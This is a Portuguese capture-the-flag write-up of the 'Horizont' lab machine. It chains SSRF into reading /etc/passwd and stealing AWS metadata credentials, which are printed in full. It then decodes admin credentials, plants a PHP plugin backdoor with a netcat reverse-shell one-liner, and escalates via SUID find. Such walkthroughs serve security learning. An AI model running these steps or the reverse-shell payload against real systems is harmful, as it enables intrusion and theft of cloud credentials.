> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [march0s1as.github.io](https://march0s1as.github.io/writeups/horizont.html)

> https://march0s1as.github.io/writeups/

Eaí, gente! Vim aqui trazer o writeup da máquina recém-lançada **Horizont**, onde nela exploraremos um **SSRF AWS**, **File Upload** e **SUID Misconfiguration** para obtermos acesso remoto à máquina. Sem mais enrolações, vamos começar! 👾

```
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
8080/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))


```

Como vimos, a máquina possui 3 portas abertas de maneira externa: SSH (onde o mesmo especifica o sistema operacional utilizado, Ubuntu), e duas HTTP (80 e 8080). Indo para a porta 80, nos deparamos com a seguinte página:

![](https://march0s1as.github.io/writeups/Writeup%20-%20Horizont%20f560d5ea61e649e8a1eb7b6f7ea50c7c/Untitled.png)

Logo de cara, não percebi nada demais. Decidi ver o código fonte da mesma (CTRL + U) e me deparo com a seguinte falcatrua:

```
<!-- scripts -->
<script src="assets/js/particles.js"></script>
<script src="assets/js/app.js"></script>

<!-- stats.js -->
<!-- set url parameter -->
<!-- set url parameter -->
<!-- set url parameter -->

</body>


```

Como vimos, há três comentários especificando para setar a string **url** como parâmetro. Feito isso, a primeira coisa que me veio à mente foi a possibilidade de um SSRF, visto que o parâmetro é bastante comum em situações no qual você se depara com a falha. Com isso, eu adicionei o parâmetro especificado e coloquei a url do meu BurpSuite Collaborator. E, conseguimos! Pegamos uma requisição! 💯

![](https://march0s1as.github.io/writeups/Writeup%20-%20Horizont%20f560d5ea61e649e8a1eb7b6f7ea50c7c/Untitled%201.png)

Server Side Request Forgery é uma falha no qual você abusa das próprias requisições feitas pelo servidor para fins maliciosos, se passando por ele. Com isso, há diversos parâmetros que podem ser validados com SSRF, como **http://**, **gopher://**, **file://**, entre outros. Após a confirmação de um SSRF, eu tentei utilizar o parâmetro **file://** para ler arquivos e, felizmente, também deu certo! O resultado ficou assim:

[http://10.9.2.10/?url=file:///etc/passwd](http://10.9.2.10/?url=file:///etc/passwd)

![](https://march0s1as.github.io/writeups/Writeup%20-%20Horizont%20f560d5ea61e649e8a1eb7b6f7ea50c7c/Untitled%202.png)

Para que não precisemos ficar sempre olhando o código fonte da página para ver o resultado do SSRF, eu programei um script em golang para agilizar o nosso tempo. Aqui está o código:

```
package main
import (
	"fmt"
	"strings"
	"net/http"
	"io/ioutil"
)

func Between(str, starting, ending string) string {
    s := strings.Index(str, starting)
    if s < 0 {
        return ""
    }
    s += len(starting)
    e := strings.Index(str[s:], ending)
    if e < 0 {
        return ""
    }
    return str[s : s+e]
}

func error(err interface{}) {
    if err != nil{
        panic(err)
    }
}

func ssrf(url string){
	req, err := http.Get(url)
	error(err)

	if req.Status != "200 OK"{
		fmt.Println(req.Status + " erro na solicitação do SSRF.")
	} else {
		body, err := ioutil.ReadAll(req.Body)
		error(err)

		fmt.Print(Between(string(body),"<!-- stats.js -->","<!-- set url parameter -->"))
	}
}

func main(){
	for {
		var payload string
		fmt.Print("~> ")
		fmt.Scan(&payload)
		site := "http://10.9.2.10/?url=" + payload
		ssrf(site)
	}
}


```

Com isso, eu apenas preciso inserir o payload no script e ele vai retornar o resultado para mim no terminal! Se liga que chique:

![](https://march0s1as.github.io/writeups/Writeup%20-%20Horizont%20f560d5ea61e649e8a1eb7b6f7ea50c7c/Untitled%203.png)

Eu sei que meu terminal parece o do grub 🤧. Enfim, dando uma olhada na porta 8080, é possível perceber que está rodando um framework em PHP chamado Laravel com base nas requisições, se liga:

![](https://march0s1as.github.io/writeups/Writeup%20-%20Horizont%20f560d5ea61e649e8a1eb7b6f7ea50c7c/Untitled%204.png)

Com base em meu conhecimento em Laravel, há um arquivo de configuração chamado **.env**, onde o mesmo possui informações sensíveis que podem levar o hacker ao acesso interno do sistema. Ao causarmos um erro na página, ele nos retorna o path de onde está rodando a aplicação

```
#57 Function: handleError File: /var/www/horizontcms/themes/TheWright/page_templates/blog.php Line: 6


```

Com isso, eu pressuponho que o arquivo **.env** esteja no **/var/www/horizontcms/.env**. Vamos aproveitar que temos um SSRF e conferir se é verdade:

![](https://march0s1as.github.io/writeups/Writeup%20-%20Horizont%20f560d5ea61e649e8a1eb7b6f7ea50c7c/Untitled%205.png)

Então toma 🥱. Vimos no arquivo que está rodando MySQL na máquina (também podemos perceber isso no arquivo /etc/passwd).

Que tal nós tentarmos um RCE via SSRF utilizando MySQL? 🧐. Existe uma ferramenta chamada **[Gopherus](https://github.com/tarunkant/Gopherus)**, onde a mesma é especializada em SSRF Protocols Smuggling utilizando o protocolo **gopher://**. Vamos tentar !

![](https://march0s1as.github.io/writeups/Writeup%20-%20Horizont%20f560d5ea61e649e8a1eb7b6f7ea50c7c/Untitled%206.png)

![](https://march0s1as.github.io/writeups/Writeup%20-%20Horizont%20f560d5ea61e649e8a1eb7b6f7ea50c7c/Untitled%207.png)

Como vimos, o resultado da requisição não nos retorna nada 😔. Bola pra frente, e vamos continuar! Após ler alguns artigos sobre SSRF, eu vi que é possível explorar a falha em um contexto de ambiente Cloud. Tendo este site como base: [SSRF - AWS](https://in1t0.github.io/hacktricks/pentesting-web/ssrf-server-side-request-forgery.html), eu consegui informações confidenciais do servidor!

![](https://march0s1as.github.io/writeups/Writeup%20-%20Horizont%20f560d5ea61e649e8a1eb7b6f7ea50c7c/Untitled%208.png)

```
{
  "Code" : "Success",
  "LastUpdated" : "2021-09-16T17:41:00Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA5W5BZR2WE4YYYFAJ",
  "SecretAccessKey" : "gYpM/uUYhmodW7p7vR3AAyyGMWn93qtEVE+u6ISk",
  "Token" : "IQoJb3JpZ2luX2VjECIaCXVzLWVhc3QtMSJHMEUCIH8kUbtkeZdOk8wlxEqnXVhwanRoPWtEwXDjlbBkzMmVAiEA7lfcuxgeuI6YcxJilkUXN829CPRh4ex0iK9eV+2zoxwq+gMIexABGgw5NDI1NDc3NjY5NTYiDIod8IIrj4X3gtZJDirXA3NARu+Xxsg6A58dkdK37EpJroSMeFOmYbxw+NT/W1K5gTO9yat/LuH9MI4tDyAtml0TwB4Lix51mE+T0xjvVgMLXNnLYd+lGjhRkuLcXgk1ZMcXIh2oTOL64de6f/OIoIvTrf1kypufipoQL3SH0UaGmd0WgW02UbJJnUi1Nav6oglLDHrzvNBjT2rwfWBhUku73lVH44Nd3ucZbQfESzBeK2H6M0Yw6LCptR0HuGMnBz67BHKxjtmKaGaD4dyBOqfDkQqf//G3jwyle9iNrS23Oenq5KvtXCJuzfpoAc/Ed4Y+qv8fJJ1o0POBJ8bUJf6PdCeFPtjPbZOR/RTaaIUagzjL5g+U/jImEcZEsfgZ4kec/ZwPDzBgUzVHx09UrQ0G9UCYbTudURYfaMfvs05eAUdoj4UY6R4Zlue+y+KWPWvpZg/TMaPJAmfdlWcZtCIHD5pJZiN/7ElygkORmhunt5MyMQRp37EQDpHYFbJmPYEuJ2XwJpxxhl7c7xwLrb0ekMRyHaLdw8UpHm+8SGcJkpYOo80VD/U0R35DXLDNOexj8k8/rl8kMxFn8ThwJ4Djs/aqvA4euMntOhpQ+3qZqnaKSiKlyaMQuWav6BJZv62W3qTvoTC7g46KBjqlAU0u+a2rdoz75v3vYOkyAA3y1EpefXmTVLVSF5x3Jxqi7e4xnKqkVbHjh6Dft2vl68LMjzECbkSJsS2Hy4WXr6BFUL5W1KVABSG7BQLO/RNHWpDy7MFzW3umwoItStwtjfwnIVXlDA7b4zVJHIUqdltuMFEEuteP+yin3+zcnf7NbGmlF7l0/bvkGSUYMDHpl2qTRcYTqcxAVBn1DZWEvQwT6ab7tQ==",
  "Expiration" : "2021-09-16T23:46:37Z"
}


```

Com isso, temos KEYS de acesso para AWS! Vamos nos autenticar! 🐰

```
nehza@kerana :/ export AWS_ACCESS_KEY_ID="ASIA5W5BZR2WE4YYYFAJ"
nehza@kerana :/ export AWS_SECRET_ACCESS_KEY="gYpM/uUYhmodW7p7vR3AAyyGMWn93qtEVE+u6ISk"
nehza@kerana :/ export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjECIaCXVzLWVhc3QtMSJHMEUCIH8kUbtkeZdOk8wlxEqnXVhwanRoPWtEwXDjlbBkzMmVAiEA7lfcuxgeuI6YcxJilkUXN829CPRh4ex0iK9eV+2zoxwq+gMIexABGgw5NDI1NDc3NjY5NTYiDIod8IIrj4X3gtZJDirXA3NARu+Xxsg6A58dkdK37EpJroSMeFOmYbxw+NT/W1K5gTO9yat/LuH9MI4tDyAtml0TwB4Lix51mE+T0xjvVgMLXNnLYd+lGjhRkuLcXgk1ZMcXIh2oTOL64de6f/OIoIvTrf1kypufipoQL3SH0UaGmd0WgW02UbJJnUi1Nav6oglLDHrzvNBjT2rwfWBhUku73lVH44Nd3ucZbQfESzBeK2H6M0Yw6LCptR0HuGMnBz67BHKxjtmKaGaD4dyBOqfDkQqf//G3jwyle9iNrS23Oenq5KvtXCJuzfpoAc/Ed4Y+qv8fJJ1o0POBJ8bUJf6PdCeFPtjPbZOR/RTaaIUagzjL5g+U/jImEcZEsfgZ4kec/ZwPDzBgUzVHx09UrQ0G9UCYbTudURYfaMfvs05eAUdoj4UY6R4Zlue+y+KWPWvpZg/TMaPJAmfdlWcZtCIHD5pJZiN/7ElygkORmhunt5MyMQRp37EQDpHYFbJmPYEuJ2XwJpxxhl7c7xwLrb0ekMRyHaLdw8UpHm+8SGcJkpYOo80VD/U0R35DXLDNOexj8k8/rl8kMxFn8ThwJ4Djs/aqvA4euMntOhpQ+3qZqnaKSiKlyaMQuWav6BJZv62W3qTvoTC7g46KBjqlAU0u+a2rdoz75v3vYOkyAA3y1EpefXmTVLVSF5x3Jxqi7e4xnKqkVbHjh6Dft2vl68LMjzECbkSJsS2Hy4WXr6BFUL5W1KVABSG7BQLO/RNHWpDy7MFzW3umwoItStwtjfwnIVXlDA7b4zVJHIUqdltuMFEEuteP+yin3+zcnf7NbGmlF7l0/bvkGSUYMDHpl2qTRcYTqcxAVBn1DZWEvQwT6ab7tQ=="


```

![](https://march0s1as.github.io/writeups/Writeup%20-%20Horizont%20f560d5ea61e649e8a1eb7b6f7ea50c7c/Untitled%209.png)

Como vimos acima, agora nós conseguimos acesso à AWS do servidor. Com isso, podemos upar, ler, e fazer download de arquivos sensíveis que estão na Cloud. Dando uma olhada no s3 **s3-ctf**, pegamos um arquivo confidencial que nos dá acesso à senha!

![](https://march0s1as.github.io/writeups/Writeup%20-%20Horizont%20f560d5ea61e649e8a1eb7b6f7ea50c7c/Untitled%2010.png)

Descriptografando o BASE64 do arquivo, obtemos credenciais que servirão de acesso ao CMS rodando na porta 8080:

```
# a url para acessar o login admin é http://10.9.2.10:8080/admin
# abaixo o usuário seguido da senha:

superadmin:v^jNazgWtWr16@9i&BSC


```

![](https://march0s1as.github.io/writeups/Writeup%20-%20Horizont%20f560d5ea61e649e8a1eb7b6f7ea50c7c/Untitled%2011.png)

Como vimos ali embaixo, no canto inferior direito, ele nos retorna a versão do CMS rodando. Procurando por exploit, eu pude achar um file upload de shell! Infelizmente, o exploit oferecido pelo metasploit não funcionou, então eu tive que fazer à mão. Se liga:

```
// 01. clone o repositório https://github.com/ttimot24/GoogleMaps/
// 02. entre em GoogleMaps/resources/lang/en/messages.php e altere o conteúdo para este:

<?php 

$backdoor = exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc SEU_IP SUA_PORTA >/tmp/f");

return [
	'successfully_added_location' => $backdoor, //'Location added succesfully!',
	'successfully_deleted_location' => 'Location deleted succesfully!',
	'successfully_set_center' => 'Location is successfully set as map center!'
];

// 03. Feito isso, compacte em ZIP todo o diretório GoogleMaps.
// 04. Acesse http://10.9.2.10:8080/admin/plugin/index
// 05. Clique em upar plugin e escolha o plugin zipado.
// 06. Ative e rode ele. Depois, entre nele e clique em "Add Location" que está em laranja. (http://10.9.2.10:8080/admin/plugin/run/google-maps)
// 07. Preencha o formulário e receba a reverse shell!


```

![](https://march0s1as.github.io/writeups/Writeup%20-%20Horizont%20f560d5ea61e649e8a1eb7b6f7ea50c7c/Untitled%2012.png)

Agora, vamos partir para a elevação de privilégios! 😈

Dando uma enumerada na máquina, eu pude perceber que há um SUID que nos permite a elevação de privilégios: **find**.

rwsr-xr-x 1 root root 233K Nov 5 2017 /usr/bin/find

Com isso, basta executarmos isto para elevar privilégios:

```
find . -exec /bin/sh -p \; -quit


```

![](https://march0s1as.github.io/writeups/Writeup%20-%20Horizont%20f560d5ea61e649e8a1eb7b6f7ea50c7c/Untitled%2013.png)

É isso! Espero que tenham gostado. Estou disposto a qualquer sugestão de melhoras dos meus writeups! 🥳